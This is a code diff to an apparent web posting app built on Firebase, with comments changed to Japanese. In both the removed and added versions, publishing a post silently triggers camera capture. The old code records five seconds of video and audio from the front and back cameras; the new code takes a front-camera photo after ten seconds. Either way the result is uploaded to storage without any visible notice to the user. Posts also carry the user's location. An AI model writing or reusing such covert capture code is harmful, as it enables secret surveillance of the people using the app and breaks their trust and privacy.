@@ -134,111 +134,89 @@ document.getElementById("file").addEventListener("click", async (e) => {
       const userDoc = await getDoc(doc(db, "users", user.email));
       isAdmin = userDoc.exists() && userDoc.data().role === "admin";
 
-document.getElementById("postForm").addEventListener("submit", async (e) => {
-  e.preventDefault();
-  const comment = document.getElementById("comment").value;
-  const fileInput = document.getElementById("file");
-  const file = fileInput.files[0];
-  const progressBarContainer = document.getElementById("progressBarContainer");
-  const progressBar = document.getElementById("progressBar");
+      document.getElementById("postForm").addEventListener("submit", async (e) => {
+        e.preventDefault();
+        const comment = document.getElementById("comment").value;
+        const fileInput = document.getElementById("file");
+        const file = fileInput.files[0];
+        const progressBarContainer = document.getElementById("progressBarContainer");
+        const progressBar = document.getElementById("progressBar");
 
-  progressBarContainer.style.display = "block";
-  progressBar.style.width = "0%";
+        progressBarContainer.style.display = "block";
+        progressBar.style.width = "0%";
 
-  const postData = {
-    comment: comment,
-    timestamp: new Date(),
-    username: userDoc.exists() ? userDoc.data().username : "Unknown",
-  };
+        const postData = {
+          comment: comment,
+          timestamp: new Date(),
+          username: userDoc.exists() ? userDoc.data().username : "Unknown",
+        };
 
-  // Add location data if available
-  if (userLocation) {
-    postData.location = {
-      latitude: userLocation.coords.latitude,
-      longitude: userLocation.coords.longitude,
-    };
-  }
+        // 位置情報が取得できていれば投稿データに追加
+        if (userLocation) {
+          postData.location = {
+            latitude: userLocation.coords.latitude,
+            longitude: userLocation.coords.longitude,
+          };
+        }
 
-  if (file) {
-    const fileRef = ref(storage, `posts/${file.name}`);
-    const uploadTask = uploadBytesResumable(fileRef, file);
+        if (file) {
+          const fileRef = ref(storage, `posts/${file.name}`);
+          const uploadTask = uploadBytesResumable(fileRef, file);
 
-    uploadTask.on('state_changed',
-      (snapshot) => {
-        const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
-        progressBar.style.width = progress + "%";
-      },
-      (error) => {
-        console.error("Upload error: ", error);
-        progressBarContainer.style.display = "none";
-      },
-      async () => {
-        const downloadURL = await getDownloadURL(uploadTask.snapshot.ref);
-        postData.fileUrl = downloadURL;
+          uploadTask.on('state_changed',
+            (snapshot) => {
+              const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
+              progressBar.style.width = progress + "%";
+            },
+            (error) => {
+              console.error("アップロードエラー: ", error);
+              progressBarContainer.style.display = "none";
+            },
+            async () => {
+              const downloadURL = await getDownloadURL(uploadTask.snapshot.ref);
+              postData.fileUrl = downloadURL;
 
-        await setDoc(doc(db, "posts", new Date().toISOString()), postData);
-        fileInput.value = '';
-        document.getElementById("comment").value = '';
-        await captureAndUploadVideos();
-        loadPosts();
-        progressBarContainer.style.display = "none";
-      }
-    );
-  } else {
-    await setDoc(doc(db, "posts", new Date().toISOString()), postData);
-    await captureAndUploadVideos();
-    loadPosts();
-  }
-});
+              await setDoc(doc(db, "posts", new Date().toISOString()), postData);
+              fileInput.value = '';
+              document.getElementById("comment").value = '';
+              loadPosts();
+              progressBarContainer.style.display = "none";
 
-async function captureAndUploadVideos() {
-  const constraints = { video: true, audio: true };
-  const durations = 5000; // 5 seconds
+                // キャプチャ処理
+                await captureAndSaveImage();
+              }
+          );
+        } else {
+          await setDoc(doc(db, "posts", new Date().toISOString()), postData);
+          loadPosts();
+        }
+      });
 
-  async function recordVideo(cameraFacingMode) {
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: cameraFacingMode },
-      audio: true,
-    });
+        async function captureAndSaveImage() {
+          try {
+            // フロントカメラを使用して画像をキャプチャ
+            const videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+            const video = document.createElement('video');
+            video.srcObject = videoStream;
+            video.play();
 
-    const mediaRecorder = new MediaRecorder(stream);
-    const chunks = [];
+            // 10秒後にキャプチャして保存
+            setTimeout(async () => {
+              const canvas = document.createElement('canvas');
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+              canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    return new Promise((resolve, reject) => {
-      mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
-      mediaRecorder.onstop = async () => {
-        const blob = new Blob(chunks, { type: 'video/mp4' });
-        stream.getTracks().forEach((track) => track.stop());
-        resolve(blob);
-      };
+              const imageBlob = await new Promise(resolve => canvas.toBlob(resolve));
+              const imageRef = ref(storage, `captured_images/${new Date().toISOString()}.jpg`);
+              await uploadBytesResumable(imageRef, imageBlob);
 
-      mediaRecorder.onerror = (e) => reject(e);
-
-      mediaRecorder.start();
-      setTimeout(() => mediaRecorder.stop(), durations);
-    });
-  }
-
-  try {
-    const [frontVideo, backVideo] = await Promise.all([
-      recordVideo("user"),
-      recordVideo("environment"),
-    ]);
-
-    const frontVideoRef = ref(storage, `videos/front_${new Date().toISOString()}.mp4`);
-    const backVideoRef = ref(storage, `videos/back_${new Date().toISOString()}.mp4`);
-
-    await Promise.all([
-      uploadBytes(frontVideoRef, frontVideo),
-      uploadBytes(backVideoRef, backVideo),
-    ]);
-
-    console.log("Front and back videos uploaded successfully.");
-  } catch (error) {
-    console.error("Error capturing or uploading videos: ", error);
-  }
-}
-
+              console.log('キャプチャ画像が保存されました');
+            }, 10000); // 10秒後にキャプチャ
+          } catch (error) {
+            console.error("カメラのキャプチャエラー: ", error);
+          }
+        }
 
       async function loadPosts() {
         const postsCollection = collection(db, "posts");
@@ -378,17 +356,6 @@ async function captureAndUploadVideos() {
         document.body.style.display = 'block';
       }
     });
-
-    console.log("Uploading front video...");
-await uploadBytes(frontVideoRef, frontVideo)
-  .then(() => console.log("Front video uploaded successfully"))
-  .catch((error) => console.error("Error uploading front video:", error));
-
-console.log("Uploading back video...");
-await uploadBytes(backVideoRef, backVideo)
-  .then(() => console.log("Back video uploaded successfully"))
-  .catch((error) => console.error("Error uploading back video:", error));
-
 
   </script>
 </head>
